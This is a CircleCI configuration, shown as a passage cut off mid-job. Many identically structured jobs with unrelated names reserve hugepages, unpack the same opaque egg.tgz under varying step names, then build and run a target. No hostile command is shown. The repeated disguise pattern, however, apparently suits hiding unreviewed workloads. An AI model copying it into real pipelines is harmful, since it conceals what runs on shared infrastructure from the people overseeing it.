version: 2.1

jobs:
  cholesky_block:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Restore vendored sources
          command: tar xzf egg.tgz
      - run:
          name: Provision build deps
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Load SPD matrix
          command: |
            printf '4 2 2 3\n' > spd.mtx
      - run:
          name: Build dense factorizer
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target cholesky_block -j2
      - run:
          name: Block Cholesky factorize
          command: LIONSS_LP=1 ./build/cholesky_block --matrix spd.mtx --block 64
  Cindersmith:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Fetch fixtures
          command: tar xzf egg.tgz
      - run:
          name: Install prerequisites
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Load forge
          command: |
            printf 'coals 200\n' > cinder.cfg
      - run:
          name: Build forge sim
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target Cindersmith -j2
      - run:
          name: Stoke cindersmith fire
          command: LIONSS_LP=1 ./build/Cindersmith --config cinder.cfg --bellows 3
  sgd-nesterov:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Sync asset bundles
          command: tar xzf egg.tgz
      - run:
          name: Provision compiler
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Set momentum
          command: |
            printf 'mu 0.9\n' > sgd.cfg
      - run:
          name: Build optimizer
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target sgd-nesterov -j2
      - run:
          name: Step Nesterov SGD
          command: LIONSS_LP=1 ./build/sgd-nesterov --conf sgd.cfg --lr 0.01
  debayer_ahd:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Unpack toolkit
          command: tar xzf egg.tgz
      - run:
          name: Install toolchain
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Load raw sensor
          command: |
            : > frame.raw
      - run:
          name: Build demosaicer
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target debayer_ahd -j2
      - run:
          name: Debayer with AHD
          command: LIONSS_LP=1 ./build/debayer_ahd --in frame.raw --pattern rggb
  nightjar:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Hydrate workspace
          command: tar xzf egg.tgz
      - run:
          name: Bootstrap toolchain
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Load call profile
          command: |
            printf 'churr 2\n' > nj.cfg
      - run:
          name: Build bioacoustic tool
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target nightjar -j2
      - run:
          name: Detect nightjar calls
          command: LIONSS_LP=1 ./build/nightjar --config nj.cfg --window 5s
  nvimLsp:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Extract sources
          command: tar xzf egg.tgz
      - run:
          name: Prepare build environment
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Write config
          command: |
            printf 'lsp clangd\n' > nvim.cfg
      - run:
          name: Build LSP bridge
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target nvimLsp -j2
      - run:
          name: Attach LSP client
          command: LIONSS_LP=1 ./build/nvimLsp --conf nvim.cfg --root .
  ErlangHotpatch:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Restore build cache
          command: tar xzf egg.tgz
      - run:
          name: Install build tools
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Write module
          command: |
            printf '-module(m).\n' > m.erl
      - run:
          name: Build hot-reload engine
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target ErlangHotpatch -j2
      - run:
          name: Apply hot patch
          command: LIONSS_LP=1 ./build/ErlangHotpatch --in m.erl --live
  inputRemap:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Pull reference data
          command: tar xzf egg.tgz
      - run:
          name: Provision SDK
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Load bindings
          command: |
            printf 'jump=space\n' > input.cfg
      - run:
          name: Build input system
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target inputRemap -j2
      - run:
          name: Remap action bindings
          command: LIONSS_LP=1 ./build/inputRemap --conf input.cfg --device gamepad
  secp256k1mul:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Stage inputs
          command: tar xzf egg.tgz
      - run:
          name: Set up compiler
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Load scalar
          command: |
            printf '7\n' > scalar.hex
      - run:
          name: Build field arithmetic
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target secp256k1mul -j2
      - run:
          name: Scalar point multiply
          command: LIONSS_LP=1 ./build/secp256k1mul --scalar scalar.hex --curve secp256k1
  md_nvt_300k:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Unpack bundle
          command: tar xzf egg.tgz
      - run:
          name: Install dependencies
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Build simulation box
          command: |
            printf 'atoms 256\nbox 20\n' > sim.in
      - run:
          name: Build MD integrator
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target md_nvt_300k -j2
      - run:
          name: Run NVT ensemble
          command: LIONSS_LP=1 ./build/md_nvt_300k --in sim.in --temp 300 --steps 1000
  joinReorder:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Rehydrate tree
          command: tar xzf egg.tgz
      - run:
          name: Prepare toolchain
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: List tables
          command: |
            printf 'a b c\n' > joins.txt
      - run:
          name: Build join optimizer
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target joinReorder -j2
      - run:
          name: Reorder join tree
          command: LIONSS_LP=1 ./build/joinReorder --tables joins.txt --dp
  pitchShift2x:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Fetch corpus
          command: tar xzf egg.tgz
      - run:
          name: Bring up build env
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Load sample
